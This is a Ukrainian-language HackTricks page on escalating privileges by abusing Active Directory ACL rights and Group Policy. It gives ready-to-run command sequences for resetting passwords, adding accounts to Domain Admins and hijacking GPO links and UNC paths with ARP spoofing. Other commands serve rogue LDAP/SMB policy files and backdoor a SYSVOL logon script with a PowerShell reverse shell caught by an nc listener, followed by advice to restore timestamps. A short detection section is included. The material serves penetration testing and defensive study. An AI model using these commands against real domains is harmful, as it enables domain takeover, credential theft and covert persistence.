# Зловживання ACL/ACE Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Ця сторінка здебільшого є оглядом технік із** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **та** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Щоб дізнатися більше, перегляньте оригінальні статті.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Права GenericAll для користувача**

Цей привілей надає attacker повний контроль над цільовим обліковим записом користувача. Після підтвердження прав `GenericAll` за допомогою команди `Get-ObjectAcl` attacker може:

- **Змінити пароль цільового користувача**: за допомогою `net user <username> <password> /domain` attacker може скинути пароль користувача.
- У Linux можна зробити те саме через SAMR за допомогою Samba `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **Якщо обліковий запис вимкнено, очистіть прапорець UAC**: `GenericAll` дозволяє редагувати `userAccountControl`. У Linux BloodyAD може видалити прапорець `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Призначити SPN обліковому запису користувача, щоб зробити його kerberoastable, а потім використати Rubeus і targetedKerberoast.py для вилучення та спроби зламати хеші ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Вимкнути попередню автентифікацію для користувача, зробивши його обліковий запис вразливим до ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Маючи `GenericAll` для користувача, можна додати облікові дані на основі сертифіката й автентифікуватися від його імені без зміни пароля. Дивіться:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Права GenericAll для групи**

Цей привілей дає зловмиснику змогу керувати членством у групі, якщо він має права `GenericAll` для такої групи, як `Domain Admins`. Після визначення distinguished name групи за допомогою `Get-NetGroup` зловмисник може:

- **Додати себе до групи Domain Admins**: Це можна зробити за допомогою прямих команд або модулів, таких як Active Directory чи PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- З Linux ви також можете використовувати BloodyAD, щоб додати себе до довільних груп, якщо маєте GenericAll/Write щодо їхнього членства. Якщо цільова група вкладена в “Remote Management Users”, ви негайно отримаєте доступ через WinRM до хостів, які враховують цю групу:<sup>[[8]](#references)</sup>
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Наявність цих привілеїв на об’єкті комп’ютера або обліковому записі користувача дає змогу:

- **Kerberos Resource-based Constrained Delegation**: дає змогу захопити об’єкт комп’ютера.
- **Shadow Credentials**: використати цю техніку для імітації облікового запису комп’ютера або користувача шляхом експлуатації привілеїв для створення shadow credentials.

## **WriteProperty on Group**

Якщо користувач має права `WriteProperty` на всі об’єкти певної групи (наприклад, `Domain Admins`), він може:

- **Add Themselves to the Domain Admins Group**: це можна реалізувати шляхом поєднання команд `net user` і `Add-NetGroupUser`; цей метод дає змогу підвищити привілеї в домені.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Цей привілей дає зловмисникам змогу додавати себе до певних груп, таких як `Domain Admins`, за допомогою команд, які безпосередньо змінюють членство в групі. Наведена нижче послідовність команд дає змогу додати себе:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Подібна привілея дозволяє attackers безпосередньо додавати себе до груп, змінюючи властивості груп, якщо вони мають право `WriteProperty` на ці групи. Підтвердження та виконання цієї привілеї здійснюються за допомогою:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Наявність `ExtendedRight` для користувача щодо `User-Force-Change-Password` дозволяє скинути пароль без знання поточного пароля. Перевірити наявність цього права та експлуатувати його можна через PowerShell або альтернативні інструменти командного рядка, використовуючи кілька способів скидання пароля користувача, зокрема інтерактивні сесії та однорядкові команди для неінтерактивних середовищ. Команди варіюються від простих викликів PowerShell до використання `rpcclient` у Linux, демонструючи універсальність векторів атак.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner для Group**

Якщо attacker виявить, що має права `WriteOwner` щодо групи, він може змінити власника групи на себе. Це особливо небезпечно, коли йдеться про `Domain Admins`, оскільки зміна власника забезпечує ширший контроль над атрибутами та членством групи. Процес передбачає ідентифікацію потрібного об’єкта за допомогою `Get-ObjectAcl`, а потім використання `Set-DomainObjectOwner` для зміни власника за SID або іменем.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Цей дозвіл дозволяє зловмиснику змінювати властивості користувача. Зокрема, маючи доступ `GenericWrite`, зловмисник може змінити шлях до logon script користувача, щоб виконати шкідливий скрипт під час входу користувача в систему. Для цього використовується команда `Set-ADObject`, яка оновлює властивість `scriptpath` цільового користувача, вказуючи на скрипт зловмисника.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Маючи цей привілей, зловмисники можуть змінювати членство в групах, наприклад додавати себе або інших користувачів до певних груп. Цей процес передбачає створення credential object, його використання для додавання або видалення користувачів із групи та перевірку змін членства за допомогою команд PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- З Linux, Samba `net` може додавати/видаляти учасників, якщо ви маєте `GenericWrite` для групи (корисно, коли PowerShell/RSAT недоступні):<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Володіння об’єктом AD і наявність привілеїв `WriteDACL` щодо нього дає зловмиснику змогу надати собі привілеї `GenericAll` над цим об’єктом. Це здійснюється за допомогою маніпуляцій ADSI, що забезпечує повний контроль над об’єктом і можливість змінювати його членство в групах. Однак під час спроби використати ці привілеї за допомогою командлетів модуля Active Directory `Set-Acl` / `Get-Acl` існують обмеження.<sup>[[4]](#references)[[7]](#references)</sup>
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### Швидке захоплення через WriteDACL/WriteOwner (PowerView)

Якщо у вас є `WriteOwner` і `WriteDacl` щодо облікового запису користувача або сервісного облікового запису, ви можете отримати повний контроль і скинути його пароль за допомогою PowerView, не знаючи старого пароля:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Примітки:
- Спочатку може знадобитися змінити власника на себе, якщо у вас є лише `WriteOwner`:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Перевірте доступ за допомогою будь-якого протоколу (SMB/LDAP/RDP/WinRM) після скидання пароля.

## **Реплікація в домені (DCSync)**

Атака DCSync використовує спеціальні дозволи на реплікацію в домені, щоб імітувати Domain Controller і синхронізувати дані, зокрема облікові дані користувачів. Ця потужна техніка потребує таких дозволів, як `DS-Replication-Get-Changes`, що дає зловмисникам змогу отримувати конфіденційну інформацію із середовища AD без прямого доступу до Domain Controller.<sup>[[5]](#references)</sup> [**Дізнайтеся більше про атаку DCSync тут.**](../dcsync.md)

## Делегування GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Делегування GPO

Делегований доступ до керування Group Policy Objects (GPO) може становити значний ризик для безпеки. Наприклад, якщо користувачу, такому як `offense\spotless`, делеговано права на керування GPO, він може мати такі привілеї, як **WriteProperty**, **WriteDacl** і **WriteOwner**. Цими дозволами можна зловживати зі зловмисною метою, що було виявлено за допомогою PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Перелік дозволів GPO

Щоб виявити неправильно налаштовані GPO, можна послідовно виконати cmdlets PowerSploit. Це дає змогу знайти GPO, якими має дозвіл керувати певний користувач: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Комп’ютери, до яких застосовано певну політику**: можна визначити, до яких комп’ютерів застосовується певний GPO, що допомагає зрозуміти масштаб потенційного впливу. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Політики, застосовані до певного комп’ютера**: щоб переглянути політики, застосовані до конкретного комп’ютера, можна використовувати такі команди, як `Get-DomainGPO`.

**OU, до яких застосовано певну політику**: визначити організаційні підрозділи (OU), на які впливає певна політика, можна за допомогою `Get-DomainOU`.

Також можна використовувати інструмент [**GPOHound**](https://github.com/cogiceo/GPOHound), щоб перелічити GPO і знайти в них проблеми.

### Abuse GPO - New-GPOImmediateTask

Неправильно налаштовані GPO можна використати для виконання коду, наприклад створивши негайне заплановане завдання. Це можна зробити, щоб додати користувача до локальної групи адміністраторів на уражених комп’ютерах, значно підвищивши привілеї:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Модуль GroupPolicy, якщо його встановлено, дає змогу створювати та пов’язувати нові GPO, а також налаштовувати параметри, наприклад значення реєстру, для виконання бекдорів на уражених комп’ютерах. Для цього методу потрібно оновити GPO, а користувач має увійти до комп’ютера для виконання:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Зловживання GPO

SharpGPOAbuse пропонує метод зловживання наявними GPO шляхом додавання завдань або зміни налаштувань без необхідності створювати нові GPO. Цей інструмент потребує зміни наявних GPO або використання інструментів RSAT для створення нових перед застосуванням змін:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Примусове оновлення політики

Оновлення GPO зазвичай відбуваються приблизно кожні 90 хвилин. Щоб пришвидшити цей процес, особливо після внесення змін, на цільовому комп'ютері можна виконати команду `gpupdate /force`, щоб примусово запустити негайне оновлення політики. Ця команда гарантує застосування всіх змін до GPO без очікування наступного автоматичного циклу оновлення.

### Що відбувається всередині

Під час перевірки Scheduled Tasks для певної GPO, наприклад `Misconfigured Policy`, можна підтвердити додавання таких завдань, як `evilTask`. Ці завдання створюються за допомогою скриптів або інструментів командного рядка для зміни поведінки системи чи підвищення привілеїв.

Структура завдання, показана у файлі конфігурації XML, згенерованому за допомогою `New-GPOImmediateTask`, містить деталі запланованого завдання, зокрема команду, яку потрібно виконати, і його тригери. Цей файл демонструє, як заплановані завдання визначаються та керуються в GPO, надаючи спосіб виконання довільних команд або скриптів у межах застосування політики.

### Користувачі та групи

GPO також дають змогу змінювати членство користувачів і груп у цільових системах. Безпосередньо редагуючи файли політик Users and Groups, attackers можуть додавати користувачів до привілейованих груп, наприклад до локальної групи `administrators`. Це можливо завдяки делегуванню дозволів на керування GPO, яке дає змогу змінювати файли політик, додавати нових користувачів або змінювати членство в групах.

Файл конфігурації XML для Users and Groups описує спосіб реалізації цих змін. Додаючи записи до цього файлу, можна надати певним користувачам підвищені привілеї в усіх уражених системах. Цей метод забезпечує прямий шлях до підвищення привілеїв через маніпуляції з GPO.

Крім того, можна розглянути додаткові методи виконання коду або підтримання persistence, зокрема використання logon/logoff scripts, зміну ключів реєстру для autoruns, інсталяцію програмного забезпечення через файли .msi або редагування конфігурацій служб. Ці техніки надають різні способи збереження доступу та контролю над цільовими системами через зловживання GPO.

### Перенаправлення отримання GPC/GPT до автентифікованих rogue services

GPO складається з LDAP **Group Policy Container (GPC)** із метаданими та розміщеного на SMB **Group Policy Template (GPT)** із файлами політики. Під час оновлення клієнт використовує `gPLink` контейнера, читає вказаний GPC і його `gPCFileSysPath`, а потім завантажує GPT із цього UNC-шляху. Отже, доступ на запис до самого GPC або до `gPLink` OU, Site чи Domain можна перетворити на привілейоване застосування політики.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Отруєння `gPCFileSysPath` за допомогою GPOddity

Якщо контрольований principal може записувати цільовий GPC (безпосередньо або через **NTLM relay to LDAP**), замініть `gPCFileSysPath` на UNC-шлях, розміщений attacker. [GPOddity](https://github.com/synacktiv/GPOddity) автоматизує зміну LDAP і обслуговує шкідливий GPT, що містить policy files на основі модулів або Immediate Task, який Group Policy client виконує як `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Анонімний SMB share або share без урахування облікових даних недостатній для сучасних Windows clients: SMB Secure Negotiate вимагає підтвердження успішної автентифікації, тому rogue service має перевірити доменну ідентичність, отримати session key SMB і правильно підписувати свої відповіді. В embedded mode налаштуйте GPOddity за допомогою контрольованого machine account і його service key, а потім виберіть payload на боці computer або user у секції `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>
```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```
**Граничний випадок User GPO:** після MS16-072 Windows усе ще створює дві SMB2-сесії в межах **одного TCP-з’єднання**: сесія користувача читає `GPT.INI`, а потім сесія облікового запису комп’ютера читає ефективну конфігурацію, наприклад `ScheduledTasks.xml`. Тому rogue server має індексувати стан автентифікації, ключі сесій і ключі підпису за `SMB2 SessionId`, а не лише за сокетом. Вбудований у GPOddity/OUned форк Scapy реалізує це через `SMBStreamSocketMultiplexing` і `SMBServer`, що підтримує multiplexing; односеансові сервери на Impacket/Scapy в іншому разі повторно використовують неправильний стан підпису та не працюють із політиками користувача.<sup>[[15]](#references)</sup>

#### Отруєння `gPLink` за допомогою OUned

Маючи `WriteGPLink`, `GenericWrite` або еквівалентний контроль над OU, Site чи Domain, атакер може додати посилання, чий GPC DN обслуговується контрольованим атакером LDAP-хостом. Цей примітив спочатку представив Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) автоматизує LDAP-запис і шкідливий ланцюжок GPC/GPT.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```
Спочатку жертва автентифікується на rogue LDAP service і отримує GPC, у якому `gPCFileSysPath` вказує на rogue SMB service; потім вона автентифікується на SMB і застосовує наданий GPT. Тому OUned потребує облікового запису з LDAP SPN, облікового запису комп’ютера з HOST SPN для SMB (той самий обліковий запис комп’ютера може задовольняти обидві вимоги), а також DNS-розв’язання або зворотного перенаправлення, яке спрямовує порти 389 і 445 на хост оператора.<sup>[[15]](#references)[[17]](#references)</sup>
```bash
python3 OUned.py --config config.ini -v
```
Вбудований Scapy LDAP server від OUned перевіряє Kerberos/SPNEGO за допомогою справжнього ключа контрольованого service і повертає довільні дані GPC з JSON. Порожній ключ JSON моделює rootDSE, префікси `base64:` позначають бінарні значення, а server підтримує add/delete/modify/search, а також пошуки `BASE`, `LEVEL` і `SUBTREE`; він може узгоджувати відсутність захисту, цілісність або конфіденційність. Це робить service придатним для повторного використання, коли інший компонент Windows переходить за контрольованим attacker LDAP-посиланням, але вимагає authenticated LDAP.<sup>[[15]](#references)</sup>

Не припускайте, що синхронізація пароля account у dummy domain відтворює кожен Kerberos key: RC4 виводиться з пароля, тоді як AES string-to-key також використовує salt, отриманий із hostname/domain principal. Передавання фактичного AES key account до `KerberosSSP` усуває потребу примусово використовувати RC4 через виявну зміну `msDS-SupportedEncryptionTypes`, яку machine account може змінювати самостійно.<sup>[[15]](#references)</sup>

#### Точки виявлення

Корелюйте зміни `gPCFileSysPath` або `gPLink` зі змінами версій GPO та появою нових XML для Immediate/Scheduled Task. Досліджуйте посилання на неочікувані naming contexts, UNC hosts за межами затвердженого набору DC/SYSVOL, DNS records, що перенаправляють імена machine accounts, LDAP/CIFS service tickets для незвичних machine accounts, а також зміни `msDS-SupportedEncryptionTypes`, які вмикають RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` для OU/domain дає змогу змінити атрибут `gPLink` цільового контейнера та **примусово застосувати наявний GPO** без редагування самого GPO. Це стає цікавим, коли пов’язаний GPO уже посилається на віддалений контент через **UNC paths** (`\\HOST\share\...`), оскільки authenticated users можуть читати **SYSVOL** і offline шукати policies, придатні для повторного використання.<sup>[[11]](#references)</sup>

Високорівневий workflow:

1. Використайте BloodHound, щоб визначити principal із `WriteGPLink` для OU, і перелічіть computers/users у цій OU.
2. Клонуйте `SYSVOL` у режимі read-only та проаналізуйте GPO, шукаючи **Software Installation**, **drive mappings** (`Drives.xml`) і **logon/startup scripts**, які посилаються на UNC paths.
3. Віддавайте перевагу policies, що вказують на **прямий hostname** (наприклад, `\\DC02\share\pkg.msi`), а не на DFS/domain-namespace paths, оскільки hostname-based paths легше перенаправити за допомогою L2 spoofing.
4. Додайте вибраний GPO GUID до `gPLink` цільової OU, щоб victim обробив цю вже наявну policy.
5. У тому самому broadcast domain виконайте ARP spoofing UNC host і прив’яжіть його IP локально (`ip addr add <target_ip>/32 dev <iface>`), щоб SMB traffic victim досягав вашого host.
6. Надайте очікувані path/filename з attacker SMB server (наприклад, `smbserver.py`) і дочекайтеся штатної обробки policy.

Приклад збору `SYSVOL` і кореляції GPO:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Прив’яжіть наявну GPO до цільового OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

Якщо пов’язаний GPO розгортає MSI з UNC-шляху, клієнт отримає його під час **запуску комп’ютера** та встановить від імені **`NT AUTHORITY\SYSTEM`**. Підмінивши вказаний хост і розмістивши шкідливий MSI під **тим самим ресурсом/шляхом/іменем**, можна перетворити `WriteGPLink` на виконання коду з правами SYSTEM **без модифікації SYSVOL**.

Важливі обмеження:

- **Час має значення**: нове посилання буде виявлено під час оновлення політики (зазвичай приблизно через ~90 хвилин), але **Software Installation** зазвичай запускається під час **перезавантаження**.
- Windows Installer зазвичай відстежує розгортання за допомогою **`ProductCode`**. Якщо продукт уже встановлено, розгортання може бути пропущено.
- Щоб уникнути відхилення інсталятором, виправте rogue MSI так, щоб його **`ProductCode`** і **`PackageCode`** відповідали легітимному пакету, очікуваному GPO.
- Старі файли реклами `.aas` можуть залишатися в `SYSVOL`, тому переконайтеся, що розгортання все ще виглядає активним, перш ніж покладатися на нього.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP-мапінги дисків у `Drives.xml` змушують користувачів автентифікуватися до налаштованого UNC-шляху під час входу в систему або повторного підключення. Якщо підмінити вказаний хост, можна перехопити **NetNTLMv2**. Якщо навмисно змусити SMB завершитися помилкою, Windows може повторити спробу через **WebDAV**, надсилаючи **NTLM через HTTP**, що значно гнучкіше для relay до **LDAP(S)**, **AD CS** або **SMB**.

#### Logon/startup script UNC hijack

Той самий підхід застосовується до скриптів, розміщених на UNC-шляхах і виявлених у `SYSVOL`:

- **Logon scripts** зазвичай виконуються в контексті **користувача**.
- **Startup scripts** зазвичай виконуються в контексті **комп’ютера / SYSTEM**.

Якщо шлях до скрипта вказує на hostname, який можна підмінити, перенаправте UNC-хост і розмістіть підмінений вміст скрипта в очікуваному місці.

## SYSVOL/NETLOGON Logon Script Poisoning

Шляхи з можливістю запису в `\\<dc>\SYSVOL\<domain>\scripts\` або `\\<dc>\NETLOGON\` дають змогу змінювати logon scripts, які виконуються під час входу користувачів через GPO. Це забезпечує code execution у контексті безпеки користувачів, які входять у систему.

### Locate logon scripts
- Перевірте атрибути користувачів на наявність налаштованого logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Проскануйте доменні спільні ресурси, щоб виявити ярлики або посилання на скрипти:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Аналізуйте файли `.lnk`, щоб визначити цілі, які вказують на SYSVOL/NETLOGON (корисний трюк DFIR і для attackers без прямого доступу до GPO):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound відображає атрибут `logonScript` (scriptPath) на вузлах користувачів, якщо він присутній.

### Перевірка доступу на запис (не довіряйте спискам share)
Автоматизовані інструменти можуть показувати SYSVOL/NETLOGON як доступні лише для читання, але базові NTFS ACL все одно можуть дозволяти запис. Завжди перевіряйте:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
Якщо розмір файлу або mtime змінюється, у вас є права на запис. Збережіть оригінали перед внесенням змін.

### Poison a VBScript logon script for RCE
Додайте команду, яка запускає PowerShell reverse shell (згенеруйте на revshells.com), і збережіть оригінальну логіку, щоб не порушити бізнес-функціональність:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Прослуховуйте ваш хост і очікуйте наступного інтерактивного входу в систему:
```bash
rlwrap -cAr nc -lnvp 443
```
Примітки:
- Виконання відбувається в контексті токена користувача, який веде журналювання (не SYSTEM). Область дії — зв’язок GPO (OU, site, domain), до якого застосовується цей скрипт.
- Після використання відновіть початковий вміст і часові позначки.


## References

- [1] [Зловживання ACL/ACE в Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Привілейовані облікові записи та привілеї токенів](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – оновлення шляху атаки ACL](https://wald0.com/?p=112)
- [4] [Перелік ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Підвищення привілеїв за допомогою ACL в Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Сканування привілеїв Active Directory та привілейованих облікових записів](https://adsecurity.org/?p=3658)
- [7] [Конструктор ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – операції з атрибутами/UAC AD з Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (членство в групах)](https://www.samba.org/)
- [10] [HTB Puppy: зловживання ACL AD, злам Argon2 KeePassXC та розшифрування DPAPI до адміністратора DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: перехоплення UNC-шляхів GPO для виконання коду та NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: експлуатація GPO Active Directory через NTLM relaying та інші способи](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU жартує? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: експлуатація прихованих векторів атак ACL організаційних підрозділів в Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Імітація легітимних сервісів Active Directory у мережі: випадок експлуатації GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
